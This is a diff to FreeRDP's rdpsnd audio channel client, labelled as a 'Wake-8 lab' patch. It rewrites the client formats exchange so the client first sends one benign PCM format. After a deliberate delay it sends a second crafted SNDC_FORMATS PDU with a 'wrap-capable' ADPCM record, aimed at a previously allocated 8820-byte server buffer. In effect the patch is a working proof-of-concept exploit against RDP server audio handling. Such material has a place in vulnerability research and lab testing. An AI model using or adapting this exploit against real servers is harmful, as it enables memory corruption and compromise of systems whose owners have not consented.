@@ -1,0 +1,65 @@
+--- /tmp/fr-wake6-fresh/src3320/channels/rdpsnd/client/rdpsnd_main.c	2026-11-21 00:34:22.297653924 +0000
++++ /tmp/fr-wake2/src3320/channels/rdpsnd/client/rdpsnd_main.c	2026-11-21 02:13:46.018692173 +0000
+@@ -217,11 +217,8 @@
+ 		return CHANNEL_RC_INITIALIZATION_ERROR;
+ 
+ 	dwVolume = IFCALLRESULT(0, rdpsnd->device->GetVolume, rdpsnd->device);
+-	wNumberOfFormats = rdpsnd->NumberOfClientFormats;
+-	length = 4 + 20;
+-
+-	for (UINT16 index = 0; index < wNumberOfFormats; index++)
+-		length += (18 + rdpsnd->ClientFormats[index].cbSize);
++	wNumberOfFormats = 1; /* Wake-8 lab: always send one benign PCM record */
++	length = 4 + 20 + 18;
+ 
+ 	/* BodySize is a UINT16 field, so the whole PDU must fit in UINT16_MAX. A server can inflate
+ 	 * the client format list through large per-format cbSize values; without this bound the
+@@ -250,20 +247,39 @@
+ 	Stream_Write_UINT16(pdu, CHANNEL_VERSION_WIN_MAX);            /* wVersion */
+ 	Stream_Write_UINT8(pdu, 0);                                   /* bPad */
+ 
+-	for (UINT16 index = 0; index < wNumberOfFormats; index++)
++	AUDIO_FORMAT benign = { WAVE_FORMAT_PCM, 2, 44100, 176400, 4, 16, 0, NULL };
++	if (!audio_format_write(pdu, &benign))
+ 	{
+-		const AUDIO_FORMAT* clientFormat = &rdpsnd->ClientFormats[index];
+-
+-		if (!audio_format_write(pdu, clientFormat))
+-		{
+-			Stream_Free(pdu, TRUE);
+-			return ERROR_INTERNAL_ERROR;
+-		}
++		Stream_Free(pdu, TRUE);
++		return ERROR_INTERNAL_ERROR;
+ 	}
+ 
+ 	WLog_Print(rdpsnd->log, WLOG_DEBUG, "%s Client Audio Formats",
+ 	           rdpsnd_is_dyn_str(rdpsnd->dynamic));
+-	return rdpsnd_virtual_channel_write(rdpsnd, pdu);
++	UINT rc = rdpsnd_virtual_channel_write(rdpsnd, pdu);
++	/* Let the server process PDU 1 before PDU 2 arrives (separate WTS messages). */
++	Sleep(400);
++	if (rc != CHANNEL_RC_OK)
++		return rc;
++
++	/* Wake-8 lab: second SNDC_FORMATS PDU, wrap-capable ADPCM record.
++	 * The first PDU selected benign PCM and allocated the 8820-byte buffer. */
++	wStream* pdu2 = Stream_New(NULL, 4 + 20 + 18);
++	AUDIO_FORMAT bad = { WAVE_FORMAT_ADPCM, 2, 44100, 176400, 8, 16, 0, NULL };
++	Stream_Write_UINT8(pdu2, SNDC_FORMATS);
++	Stream_Write_UINT8(pdu2, 0);
++	Stream_Write_UINT16(pdu2, 20 + 18);
++	Stream_Write_UINT32(pdu2, TSSNDCAPS_ALIVE | TSSNDCAPS_VOLUME);
++	Stream_Write_UINT32(pdu2, dwVolume);
++	Stream_Write_UINT32(pdu2, 0);
++	Stream_Write_UINT16(pdu2, 0);
++	Stream_Write_UINT16(pdu2, 1);
++	Stream_Write_UINT8(pdu2, 0);
++	Stream_Write_UINT16(pdu2, CHANNEL_VERSION_WIN_MAX);
++	Stream_Write_UINT8(pdu2, 0);
++	if (!audio_format_write(pdu2, &bad))
++		return ERROR_INTERNAL_ERROR;
++	return rdpsnd_virtual_channel_write(rdpsnd, pdu2);
+ }
+ 
+ /**
